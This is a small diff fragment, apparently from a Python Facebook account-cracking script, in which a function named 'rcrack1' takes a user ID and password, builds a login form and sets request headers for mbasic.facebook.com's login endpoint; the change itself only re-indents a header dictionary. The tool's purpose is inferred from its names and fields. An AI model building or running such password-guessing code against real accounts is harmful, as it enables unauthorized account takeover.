@@ -331,8 +331,8 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             #_____Mathoid______#
-            Old
-header_freefb = {'authority': 'mbasic.facebook.com',
+           
+            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
